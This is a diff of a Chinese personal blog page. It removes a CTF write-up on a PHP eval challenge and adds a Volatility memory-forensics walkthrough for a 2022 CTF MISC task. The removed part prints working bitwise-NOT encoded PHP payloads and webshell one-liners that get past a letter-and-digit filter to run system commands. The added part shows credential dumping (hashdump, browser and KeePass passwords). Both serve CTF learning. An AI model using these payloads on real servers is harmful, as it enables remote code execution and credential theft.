@@ -151,7 +151,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">42</span>
+          <span class="site-state-item-count">43</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -203,7 +203,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://monkeyx1.github.io/2022/12/07/%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E9%A2%98%E7%9B%AE/">
+    <link itemprop="mainEntityOfPage" href="https://monkeyx1.github.io/2022/12/09/2022%E2%80%94%E2%80%94%E8%B5%A3%E7%BD%91%E6%9D%AFMISC%E9%A2%98%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0volatility/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/header.jpg">
@@ -221,7 +221,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/12/07/%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E9%A2%98%E7%9B%AE/" class="post-title-link" itemprop="url">记录一道代码执行题目</a>
+          <a href="/2022/12/09/2022%E2%80%94%E2%80%94%E8%B5%A3%E7%BD%91%E6%9D%AFMISC%E9%A2%98%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0volatility/" class="post-title-link" itemprop="url">2022——赣网杯MISC题目来学习volatility</a>
         </h2>
 
         <div class="post-meta-container">
@@ -232,7 +232,7 @@
       </span>
       <span class="post-meta-item-text">发表于</span>
 
-      <time title="创建时间：2022-12-07 10:56:27" itemprop="dateCreated datePublished" datetime="2022-12-07T10:56:27+08:00">2022-12-07</time>
+      <time title="创建时间：2022-12-09 21:30:02" itemprop="dateCreated datePublished" datetime="2022-12-09T21:30:02+08:00">2022-12-09</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -252,7 +252,7 @@
     </span>
 
   
-    <span id="/2022/12/07/%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E9%A2%98%E7%9B%AE/" class="post-meta-item leancloud_visitors" data-flag-title="记录一道代码执行题目" title="阅读次数">
+    <span id="/2022/12/09/2022%E2%80%94%E2%80%94%E8%B5%A3%E7%BD%91%E6%9D%AFMISC%E9%A2%98%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0volatility/" class="post-meta-item leancloud_visitors" data-flag-title="2022——赣网杯MISC题目来学习volatility" title="阅读次数">
       <span class="post-meta-item-icon">
         <i class="far fa-eye"></i>
       </span>
@@ -265,14 +265,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>1.1k</span>
+      <span>2.1k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>1 分钟</span>
+      <span>2 分钟</span>
     </span>
 </div>
 
@@ -283,29 +283,129 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getPos</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    @<span class="keyword">include</span> <span class="string">&#x27;find.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$findflag</span>;</span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span> php</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;cover&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;cover&#x27;</span>] == <span class="variable">$_SESSION</span>[<span class="string">&#x27;cover&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]) &gt; <span class="number">35</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;over maxlength!!&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9_.]+/&quot;</span>, <span class="variable">$code</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&quot;Hacher!!!&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>        <span class="keyword">echo</span> <span class="string">&#x27;Access Deny&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>第一个if刚开始想复杂了，弱比较，其实直接为空就可以绕过了。</p>
-<p><img src="/images/%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E9%A2%98%E7%9B%AE/image-5-1024x479.png"></p>
-<p>然后就是后面的正则匹配了，不能出现字母和数字以及<code>_.</code>，这还是P神的无数字字符的webshell。使用取反绕过</p>
-<p><img src="/images/%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E9%A2%98%E7%9B%AE/image-6-1024x569.png"></p>
-<p>然后可以使用一句话，但是这似乎跟PHP的版本有关系。</p>
+          <p>下载的附件是一个raw文件</p>
+<p>1.先使用vol查看镜像的配置文件</p>
 <blockquote>
-<p>?cover&#x3D;&amp;code&#x3D;(<del>%9E%8C%8C%9A%8D%8B)(</del>%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%C7%A2%D6%D6);</p>
+<p>.&#x2F;volatility -f 1.raw imageinfo</p>
 </blockquote>
-<p><img src="/images/%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E9%A2%98%E7%9B%AE/image-7-1024x515.png"></p>
-<p>这里只发现7.0.9版本是可以的。</p>
-<p>但是我们为什么执意要搞到shell呢？RCE也很香吧……使用<code>system(&#39;ls&#39;)</code></p>
+<p><img src="/images/2022%E2%80%94%E2%80%94%E8%B5%A3%E7%BD%91%E6%9D%AFMISC%E9%A2%98%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0volatility/image-16-1024x329.png"></p>
+<p>2.发现是<code>Win7SP1x64</code>的系统，然后查看进程</p>
 <blockquote>
-<p>(<del>%8C%86%8C%8B%9A%92)(</del>%93%8C);</p>
+<p>.&#x2F;volatility -f 1.raw –profile&#x3D;Win7SP1x64 pslist</p>
 </blockquote>
-<p><img src="/images/%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E9%A2%98%E7%9B%AE/image-8-1024x654.png"></p>
-<p>其实这里也是可以拿到shell的，不能死死的抓着一个东西不放，还是得换换思路</p>
-<p>过滤还是有很多没有进行过滤的，所以我们还可以利用其他没有过滤的字符</p>
+<p><img src="/images/2022%E2%80%94%E2%80%94%E8%B5%A3%E7%BD%91%E6%9D%AFMISC%E9%A2%98%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0volatility/image-17-1024x546.png"></p>
+<p><img src="/images/2022%E2%80%94%E2%80%94%E8%B5%A3%E7%BD%91%E6%9D%AFMISC%E9%A2%98%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0volatility/image-18-1024x542.png"></p>
+<p>3.例如这里要导出的文件是<code>DumpIt.exe</code>，那么我们可以查看cmd使用情况</p>
 <blockquote>
-<p>一句话：?&gt;<?=`{${~"%a0%b8%ba%ab"}[%C7]}`?>&amp;%C7&#x3D;’ls’;</p>
-<p>?&gt;<?={$_GET[%C7]?>}&amp;%C7&#x3D;’ls’;</p>
+<p>.&#x2F;volatility -f 1.raw –profile&#x3D;Win7SP1x64 cmdscan</p>
 </blockquote>
+<p><img src="/images/2022%E2%80%94%E2%80%94%E8%B5%A3%E7%BD%91%E6%9D%AFMISC%E9%A2%98%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0volatility/image-19-1024x228.png"></p>
+<p>4.然后将<code>DumpIt.exe</code>导出到本地（从内存dump进程的内存，提取进程）</p>
+<blockquote>
+<p>.&#x2F;volatility -f 1.raw –profile&#x3D;Win7SP1x64 memdump -p 4272 –dump-dir&#x3D;.&#x2F;</p>
+<p>-p：指定PID号<br>–dump-dir&#x3D;接上要存储文件的路径</p>
+</blockquote>
+<p><img src="/images/2022%E2%80%94%E2%80%94%E8%B5%A3%E7%BD%91%E6%9D%AFMISC%E9%A2%98%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0volatility/image-20-1024x203.png"></p>
+<p>这里得到文件之后我们可以使用foremost进行分离</p>
+<p><img src="/images/2022%E2%80%94%E2%80%94%E8%B5%A3%E7%BD%91%E6%9D%AFMISC%E9%A2%98%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0volatility/image-21-1024x508.png"></p>
+<p>5.使用命令查看桌面的情况</p>
+<blockquote>
+<p>.&#x2F;volatility -f 1.raw –profile&#x3D;Win7SP1x64 filescan |grep Desktop</p>
+<p>filescan：扫描文件，可以搭配grep使用，从而快速查找关键文件</p>
+</blockquote>
+<p><img src="/images/2022%E2%80%94%E2%80%94%E8%B5%A3%E7%BD%91%E6%9D%AFMISC%E9%A2%98%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0volatility/image-22-1024x542.png"></p>
+<p>6.这里发现了<code>flag.kdbxdbx</code>文件，应该是有内容的，所以我们将其导出</p>
+<blockquote>
+<p>.&#x2F;volatility -f 1.raw –profile&#x3D;Win7SP1x64 dumpfiles -Q 0x000000002a2897e0 -D .&#x2F;</p>
+<p>dumpfiles：从内存dump文件<br>-Q：指定偏移量<br>-D：存储文件的文件夹</p>
+</blockquote>
+<p><img src="/images/2022%E2%80%94%E2%80%94%E8%B5%A3%E7%BD%91%E6%9D%AFMISC%E9%A2%98%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0volatility/image-23-1024x214.png"></p>
+<p><img src="/images/2022%E2%80%94%E2%80%94%E8%B5%A3%E7%BD%91%E6%9D%AFMISC%E9%A2%98%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0volatility/image-24-1024x217.png"></p>
+<p>然后本题使用<code>keePass</code>解密即可得到flag，之前得到的是火狐浏览器密码，使用<code>firepwd</code>即可解密得到<code>keePass</code>密码</p>
+<p>7.列出历史cmd命令</p>
+<blockquote>
+<p>.&#x2F;volatility -f 1.raw –profile&#x3D;Win7SP1x64 cmdline</p>
+<p>.&#x2F;volatility -f 1.raw –profile&#x3D;Win7SP1x64 cmdscan</p>
+</blockquote>
+<p><img src="/images/2022%E2%80%94%E2%80%94%E8%B5%A3%E7%BD%91%E6%9D%AFMISC%E9%A2%98%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0volatility/image-25-1024x541.png"></p>
+<p><img src="/images/2022%E2%80%94%E2%80%94%E8%B5%A3%E7%BD%91%E6%9D%AFMISC%E9%A2%98%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0volatility/image-26-1024x173.png"></p>
+<p>8.列出进程列表</p>
+<blockquote>
+<p>.&#x2F;volatility -f 1.raw –profile&#x3D;Win7SP1x64 psscan</p>
+<p>.&#x2F;volatility -f 1.raw –profile&#x3D;Win7SP1x64 pslist</p>
+</blockquote>
+<p><img src="/images/2022%E2%80%94%E2%80%94%E8%B5%A3%E7%BD%91%E6%9D%AFMISC%E9%A2%98%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0volatility/image-27-1024x509.png"></p>
+<p>9.扫描建立的连接和套接字，类似于netstat</p>
+<blockquote>
+<p>.&#x2F;volatility -f 1.raw –profile&#x3D;Win7SP1x64 netscan</p>
+</blockquote>
+<p><img src="/images/2022%E2%80%94%E2%80%94%E8%B5%A3%E7%BD%91%E6%9D%AFMISC%E9%A2%98%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0volatility/image-28-1024x542.png"></p>
+<p>10.扫描windows服务列表</p>
+<blockquote>
+<p>.&#x2F;volatility -f 1.raw –profile&#x3D;Win7SP1x64 svcscan</p>
+</blockquote>
+<p><img src="/images/2022%E2%80%94%E2%80%94%E8%B5%A3%E7%BD%91%E6%9D%AFMISC%E9%A2%98%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0volatility/image-29-1024x542.png"></p>
+<p>11.显示GDI样式的截屏</p>
+<blockquote>
+<p>.&#x2F;volatility -f 1.raw –profile&#x3D;Win7SP1x64 screenshot –dump-dir&#x3D;.&#x2F;</p>
+</blockquote>
+<p><img src="/images/2022%E2%80%94%E2%80%94%E8%B5%A3%E7%BD%91%E6%9D%AFMISC%E9%A2%98%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0volatility/image-30-1024x447.png"></p>
+<p>12.显示每个进程的加载dll列表</p>
+<blockquote>
+<p>.&#x2F;volatility -f 1.raw –profile&#x3D;Win7SP1x64 dlllist</p>
+</blockquote>
+<p><img src="/images/2022%E2%80%94%E2%80%94%E8%B5%A3%E7%BD%91%E6%9D%AFMISC%E9%A2%98%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0volatility/image-31-1024x542.png"></p>
+<p>13.提取日志文件</p>
+<blockquote>
+<p>.&#x2F;volatility -f 1.raw –profile&#x3D;Win7SP1x64 dumpregistry –dump-dir&#x3D;.&#x2F;</p>
+</blockquote>
+<p><img src="/images/2022%E2%80%94%E2%80%94%E8%B5%A3%E7%BD%91%E6%9D%AFMISC%E9%A2%98%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0volatility/image-32-1024x540.png"></p>
+<p><img src="/images/2022%E2%80%94%E2%80%94%E8%B5%A3%E7%BD%91%E6%9D%AFMISC%E9%A2%98%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0volatility/image-33-1024x101.png"></p>
+<p>14.查看用户名密码信息</p>
+<blockquote>
+<p>.&#x2F;volatility -f 1.raw –profile&#x3D;Win7SP1x64 hashdump</p>
+</blockquote>
+<p><img src="/images/2022%E2%80%94%E2%80%94%E8%B5%A3%E7%BD%91%E6%9D%AFMISC%E9%A2%98%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0volatility/image-34-1024x179.png"></p>
+<p>15.查看浏览器历史记录</p>
+<blockquote>
+<p>.&#x2F;volatility -f 1.raw –profile&#x3D;Win7SP1x64 iehistory</p>
+</blockquote>
+<p><img src="/images/2022%E2%80%94%E2%80%94%E8%B5%A3%E7%BD%91%E6%9D%AFMISC%E9%A2%98%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0volatility/image-35-1024x204.png"></p>
+<p>16.查看文件</p>
+<blockquote>
+<p>.&#x2F;volatility -f 1.raw –profile&#x3D;Win7SP1x64 filescan</p>
+</blockquote>
+<p><img src="/images/2022%E2%80%94%E2%80%94%E8%B5%A3%E7%BD%91%E6%9D%AFMISC%E9%A2%98%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0volatility/image-36-1024x541.png"></p>
+<p>17.查看注册表配置单元</p>
+<blockquote>
+<p>.&#x2F;volatility -f 1.raw –profile&#x3D;Win7SP1x64 hivelist</p>
+</blockquote>
+<p><img src="/images/2022%E2%80%94%E2%80%94%E8%B5%A3%E7%BD%91%E6%9D%AFMISC%E9%A2%98%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0volatility/image-37-1024x266.png"></p>
+<p>18.查看注册表键名</p>
+<blockquote>
+<p>.&#x2F;volatility -f 1.raw –profile&#x3D;Win7SP1x64 hivedump -o 0xfffff8a005fef010</p>
+</blockquote>
+<p><img src="/images/2022%E2%80%94%E2%80%94%E8%B5%A3%E7%BD%91%E6%9D%AFMISC%E9%A2%98%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0volatility/image-38-1024x127.png"></p>
+<p>19.查看注册表键值</p>
+<blockquote>
+<p>.&#x2F;volatility -f 1.vmem –profile&#x3D;Win7SP1x64 printkey -K “xxxxxxx”</p>
+</blockquote>
+<p>20.查看运行程序相关的记录，比如最后一次更新时间，运行过的次数等</p>
+<blockquote>
+<p>.&#x2F;volatility -f 1.raw –profile&#x3D;Win7SP1x64 userassist</p>
+</blockquote>
+<p><img src="/images/2022%E2%80%94%E2%80%94%E8%B5%A3%E7%BD%91%E6%9D%AFMISC%E9%A2%98%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0volatility/image-39-1024x543.png"></p>
+<p>21.最大程序提取信息</p>
+<blockquote>
+<p>.&#x2F;volatility -f 1.raw –profile&#x3D;Win7SP1x64 timeliner</p>
+</blockquote>
+<p><img src="/images/2022%E2%80%94%E2%80%94%E8%B5%A3%E7%BD%91%E6%9D%AFMISC%E9%A2%98%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0volatility/image-40-1024x541.png"></p>
+<p>参考文章：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://juejin.cn/post/7107500079816114189">VOL（Volatility）内存取证工具</a></li>
+<li><a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/Volatility.html">Volatility取证分析工具</a></li>
+</ul>
+<p>如果文章有何不妥之处，请您指出。</p>
 
       
     </div>
@@ -325,7 +425,7 @@
 
 
   <nav class="pagination">
-    <a class="extend prev" rel="prev" title="上一页" aria-label="上一页" href="/page/21/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/21/">21</a><span class="page-number current">22</span><a class="page-number" href="/page/23/">23</a><span class="space">&hellip;</span><a class="page-number" href="/page/42/">42</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/23/"><i class="fa fa-angle-right"></i></a>
+    <a class="extend prev" rel="prev" title="上一页" aria-label="上一页" href="/page/21/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/21/">21</a><span class="page-number current">22</span><a class="page-number" href="/page/23/">23</a><span class="space">&hellip;</span><a class="page-number" href="/page/43/">43</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/23/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 </div>
@@ -349,7 +449,7 @@
       <i class="fa fa-chart-line"></i>
     </span>
       <span>站点总字数：</span>
-    <span title="站点总字数">180k</span>
+    <span title="站点总字数">181k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
